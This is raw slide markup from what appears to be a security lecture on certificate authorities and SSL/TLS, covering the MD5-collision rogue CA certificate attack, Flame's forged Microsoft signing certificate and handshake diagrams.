            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>prefix (difference)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949700" name="object 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7905240" y="3885840"/>
            <a:ext cx="703080" cy="255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1" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>CA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>bit!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04919" name="object 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6985800" y="4278240"/>
            <a:ext cx="15476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We</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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are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now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an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445649" name="object 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5603400" y="4548960"/>
            <a:ext cx="3113640" cy="42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700" b="0" strike="noStrike" spc="-1" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Netscape</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="0" strike="noStrike" spc="-69" baseline="-2500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700" b="0" strike="noStrike" spc="-1" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Co</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="0" strike="noStrike" spc="245" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="3366FF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intermediate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CA.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409775" name="object 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6111360" y="4897800"/>
            <a:ext cx="1590480" cy="42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1">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Extensio</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="0" strike="noStrike" spc="-15" baseline="30000">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>W00T!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426885" name="object 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5105520" y="1143000"/>
            <a:ext cx="3754440" cy="369720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 3754440"/>
              <a:gd name="textAreaRight" fmla="*/ 3754800 w 3754440"/>
              <a:gd name="textAreaTop" fmla="*/ 0 h 369720"/>
              <a:gd name="textAreaBottom" fmla="*/ 370080 h 369720"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
            <a:pathLst>
              <a:path w="3754754" h="370205" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="3754437" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="369887"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3754437" y="369887"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="375443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63969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Result:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="4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Perfect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="9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Man-in-the-Middle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5281702" name="object 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1633320"/>
            <a:ext cx="7716960" cy="128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33120" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="355680" indent="-343080">
              <a:lnSpc>
                <a:spcPts val="3300"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="26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This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skeleton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2800" b="0" strike="noStrike" spc="-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2800" b="0" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic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certificate: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it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can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issue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fully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trusted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u="sng" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>any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(why?)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718758" name="object 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="5026680"/>
            <a:ext cx="7022880" cy="1778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08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85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take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advantage,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need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network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attack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820"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="791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Insecure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wireless,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DNS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poisoning,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proxy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auto-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discovery,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hacked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routers,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etc.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628564" name="object 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5184000" y="1176120"/>
            <a:ext cx="360576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[Sotirov</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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Rogue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Certificates</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic"/>
              </a:rPr>
              <a:t>”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]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3290222" name="object 7"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1371600" y="2747880"/>
            <a:ext cx="5486039" cy="2052360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11533849" name="object 8"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7512120" y="2567880"/>
            <a:ext cx="1333080" cy="779040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1024807526" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="69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0EE3D791-2972-4218-88D4-74F978672239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95746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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-55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Rogue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Certificate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97871118" name="object 3"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2286000" y="1611360"/>
            <a:ext cx="4114440" cy="4789080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="807969852" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="70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223AC82-40D7-4F12-BF9C-D09D9AA382CD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035185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Remember</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-3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Flame?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101316" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="71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A394E181-AAF4-4D04-9417-7CCB8E0FB07A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9520265" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1555560"/>
            <a:ext cx="8005680" cy="557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Cyber-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espionage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virus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(2010-2012)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Signed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with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fake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intermediate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appears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issued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Microsoft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thus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accepted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any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Windows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Update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service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99000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="621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Fake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intermediate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created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an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MD5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chosen-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prefix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collision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against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obscure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Microsoft</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-5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Terminal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Server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Licensing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Service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certificate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that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enabled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for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code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-26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C00000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>signing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:srgbClr val="C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still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MD5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ts val="3328"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="831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MD5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collision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technique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possibly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pre-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dates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Sotirov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et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al.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="28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28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work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05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Evidence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state-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level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cryptanalysis?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191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SSL/TLS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Handshake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78899990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700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1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47439026" name="object 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="804600" y="3698640"/>
            <a:ext cx="36108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C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9631952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704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5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14446058" name="object 10"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3429000" y="3124080"/>
            <a:ext cx="3733560" cy="151920"/>
            <a:chOff x="3429000" y="3124080"/>
            <a:chExt cx="3733560" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="707" name="object 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3513600" y="3200400"/>
              <a:ext cx="3648960" cy="360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 3648960"/>
                <a:gd name="textAreaRight" fmla="*/ 3649320 w 3648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649345" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3649132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8" name="object 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3429000" y="31240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96702775" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1556640"/>
            <a:ext cx="7235640" cy="3976560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="89280" rIns="0" bIns="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="141588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3200" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Hello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2832120" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="3359"/>
              </a:spcBef>
              <a:buNone/>
              <a:defRPr/>
            </a:pP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32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32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my</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="32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1">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>certificate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61262624" name="object 14"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="7404120" y="1920960"/>
            <a:ext cx="1053720" cy="4098600"/>
            <a:chOff x="7404120" y="1920960"/>
            <a:chExt cx="1053720" cy="4098600"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="711" name="object 15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50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2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50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50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2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80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50" y="4098925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="545553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6" y="4930"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="527050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2" name="object 16"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="7404120" y="192096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50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6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2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2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6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9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8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8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9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50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700040" name="object 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7764120" y="3622320"/>
            <a:ext cx="3369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4400" b="0" strike="noStrike" spc="-52">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>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3688881" name="object 18"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1290960" y="3610080"/>
            <a:ext cx="3204360" cy="1876680"/>
            <a:chOff x="1290960" y="3610080"/>
            <a:chExt cx="3204360" cy="1876680"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="715" name="object 19"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1290960" y="3610080"/>
              <a:ext cx="3204360" cy="1876680"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 3204360"/>
                <a:gd name="textAreaRight" fmla="*/ 3204720 w 3204360"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 1876680"/>
                <a:gd name="textAreaBottom" fmla="*/ 1877040 h 1876680"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="3204845" h="1877060" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="945121" y="657233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="493213" y="657233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="493213" y="1876433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3204662" y="1876433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3204662" y="657233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1622983" y="657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object 20"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1290960" y="3610080"/>
              <a:ext cx="3204360" cy="1876680"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 3204360"/>
                <a:gd name="textAreaRight" fmla="*/ 3204720 w 3204360"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 1876680"/>
                <a:gd name="textAreaBottom" fmla="*/ 1877040 h 1876680"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="3204845" h="1877060" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="493212" y="657233"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="945120" y="657233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1622983" y="657233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3204662" y="657233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3204662" y="860433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3204662" y="1165233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3204662" y="1876433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1622983" y="1876433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="945120" y="1876433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="493212" y="1876433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="493212" y="1165233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="493212" y="860433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="493212" y="657233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9622924" name="object 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1863000" y="4217760"/>
            <a:ext cx="2481840" cy="1558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40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25"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Validate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9"/>
              </a:spcBef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32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32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4618014" name="object 22"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4390920" y="3622680"/>
            <a:ext cx="1856880" cy="2625480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14265354" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="72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6384B8E0-FDB4-4A14-8EC9-F42351BFB223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36109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SSL/TLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-2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Handshake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23779978" name="object 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="457200" y="1996920"/>
            <a:ext cx="1053720" cy="4098600"/>
            <a:chOff x="457200" y="1996920"/>
            <a:chExt cx="1053720" cy="4098600"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="722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27709194" name="object 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="588600" y="3684960"/>
            <a:ext cx="800280" cy="97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03040" indent="-190440">
              <a:lnSpc>
                <a:spcPct val="117000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="99"/>
              </a:spcBef>
              <a:tabLst>
                <a:tab pos="0" algn="l"/>
              </a:tabLst>
              <a:defRPr/>
            </a:pP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Android </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>app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68941548" name="object 7"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1942920" y="2134800"/>
            <a:ext cx="3162240" cy="151920"/>
            <a:chOff x="1942920" y="2134800"/>
            <a:chExt cx="3162240" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="726" name="object 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1942920" y="221004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object 9"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4851000" y="213480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12264423" name="object 10"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3429000" y="3809880"/>
            <a:ext cx="3733560" cy="151920"/>
            <a:chOff x="3429000" y="3809880"/>
            <a:chExt cx="3733560" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="729" name="object 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3513600" y="3886200"/>
              <a:ext cx="3648960" cy="360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 3648960"/>
                <a:gd name="textAreaRight" fmla="*/ 3649320 w 36489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649345" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3649132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object 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3429000" y="38098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6814810" name="object 13"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="357120" y="3124080"/>
            <a:ext cx="2081160" cy="2590920"/>
            <a:chOff x="357120" y="3124080"/>
            <a:chExt cx="2081160" cy="2590920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="732" name="object 14"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId3"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="357120" y="3124080"/>
              <a:ext cx="1318680" cy="80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33" name="object 15"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1342800" y="4776840"/>
              <a:ext cx="1095480" cy="938160"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 1095480"/>
                <a:gd name="textAreaRight" fmla="*/ 1095840 w 1095480"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 938160"/>
                <a:gd name="textAreaBottom" fmla="*/ 938520 h 938160"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="1096010" h="938529" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="323156" y="328616"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="168639" y="328616"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="168639" y="938216"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1095739" y="938216"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1095739" y="328616"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="554931" y="3286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4" name="object 16"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1342800" y="4776840"/>
              <a:ext cx="1095480" cy="938160"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 1095480"/>
                <a:gd name="textAreaRight" fmla="*/ 1095840 w 1095480"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 938160"/>
                <a:gd name="textAreaBottom" fmla="*/ 938520 h 938160"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="1096010" h="938529" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="168638" y="328616"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="323155" y="328616"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="554930" y="328616"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1095738" y="328616"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1095738" y="430216"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1095738" y="582616"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1095738" y="938216"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="554930" y="938216"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="323155" y="938216"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="168638" y="938216"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="168638" y="582616"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="168638" y="430216"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="168638" y="32861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57654231" name="object 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1939320" y="1633320"/>
            <a:ext cx="5234039" cy="252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3200" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Hello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6"/>
              </a:spcBef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1428840" indent="26640">
              <a:lnSpc>
                <a:spcPct val="104000"/>
              </a:lnSpc>
              <a:tabLst>
                <a:tab pos="0" algn="l"/>
              </a:tabLst>
              <a:defRPr/>
            </a:pP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I</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="32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am</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> Chase.com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32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32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">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>my</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" strike="noStrike" spc="-52">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>certificate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5831632" name="object 18"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7467480" y="2270160"/>
